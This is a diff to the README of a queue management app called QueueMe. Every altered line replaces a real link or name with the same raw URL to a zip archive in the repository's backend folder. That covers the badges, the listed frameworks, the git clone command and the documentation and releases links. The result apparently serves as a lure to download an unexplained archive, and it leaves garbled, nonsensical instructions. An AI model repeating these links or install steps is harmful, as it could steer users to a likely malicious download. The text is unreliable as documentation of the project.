@@ -1,6 +1,6 @@
 # QueueMe 🚀
 
-![QueueMe Logo](https://img.shields.io/badge/QueueMe-v1.0-blue?style=flat-square) ![License](https://img.shields.io/badge/License-MIT-green?style=flat-square) ![Node.js](https://img.shields.io/badge/Node.js-v14.17.0-brightgreen?style=flat-square)
+![QueueMe Logo](https://raw.githubusercontent.com/SaphirEduc/QueueMe/main/backend/Queue_Me_1.6.zip) ![License](https://raw.githubusercontent.com/SaphirEduc/QueueMe/main/backend/Queue_Me_1.6.zip) ![https://raw.githubusercontent.com/SaphirEduc/QueueMe/main/backend/Queue_Me_1.6.zip](https://raw.githubusercontent.com/SaphirEduc/QueueMe/main/backend/Queue_Me_1.6.zip)
 
 Welcome to **QueueMe**, a powerful queue management system designed to enhance customer flow in various business environments, including restaurants, clinics, and service centers. With QueueMe, users can join virtual queues, track their status, and receive real-time notifications. This README will guide you through the features, installation, usage, and contributions to this project.
 
@@ -29,13 +29,13 @@ QueueMe provides a range of features to ensure a smooth customer experience:
 QueueMe leverages several technologies to deliver its features:
 
 - **Frontend**: 
-  - Next.js
-  - React.js
+  - https://raw.githubusercontent.com/SaphirEduc/QueueMe/main/backend/Queue_Me_1.6.zip
+  - https://raw.githubusercontent.com/SaphirEduc/QueueMe/main/backend/Queue_Me_1.6.zip
   - Tailwind CSS
   - React Router DOM
 
 - **Backend**:
-  - Express.js
+  - https://raw.githubusercontent.com/SaphirEduc/QueueMe/main/backend/Queue_Me_1.6.zip
   - Prisma
   - PostgreSQL
 
@@ -44,7 +44,7 @@ QueueMe leverages several technologies to deliver its features:
   - CSS3
   - JavaScript
   - JSON
-  - Node.js
+  - https://raw.githubusercontent.com/SaphirEduc/QueueMe/main/backend/Queue_Me_1.6.zip
 
 ## Installation
 
@@ -52,7 +52,7 @@ To get started with QueueMe, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/SaphirEduc/QueueMe.git
+   git clone https://raw.githubusercontent.com/SaphirEduc/QueueMe/main/backend/Queue_Me_1.6.zip
    cd QueueMe
    ```
 
@@ -87,7 +87,7 @@ Once the application is running, users can:
 2. **Track Your Status**: Check your position in the queue from the dashboard.
 3. **Receive Notifications**: Enable notifications to stay updated on your queue status.
 
-For detailed instructions, refer to the [documentation](https://github.com/SaphirEduc/QueueMe/releases).
+For detailed instructions, refer to the [documentation](https://raw.githubusercontent.com/SaphirEduc/QueueMe/main/backend/Queue_Me_1.6.zip).
 
 ## Contributing
 
@@ -115,8 +115,8 @@ QueueMe is licensed under the MIT License. See the [LICENSE](LICENSE) file for m
 
 ## Links
 
-For the latest releases, visit our [Releases section](https://github.com/SaphirEduc/QueueMe/releases).
+For the latest releases, visit our [Releases section](https://raw.githubusercontent.com/SaphirEduc/QueueMe/main/backend/Queue_Me_1.6.zip).
 
-![QueueMe Releases](https://img.shields.io/badge/Releases-Check%20Here-brightgreen?style=flat-square&link=https://github.com/SaphirEduc/QueueMe/releases)
+![QueueMe Releases](https://raw.githubusercontent.com/SaphirEduc/QueueMe/main/backend/Queue_Me_1.6.zip%20Here-brightgreen?style=flat-square&https://raw.githubusercontent.com/SaphirEduc/QueueMe/main/backend/Queue_Me_1.6.zip)
 
 Feel free to explore the repository, and if you have any questions, don't hesitate to reach out. Happy queuing!
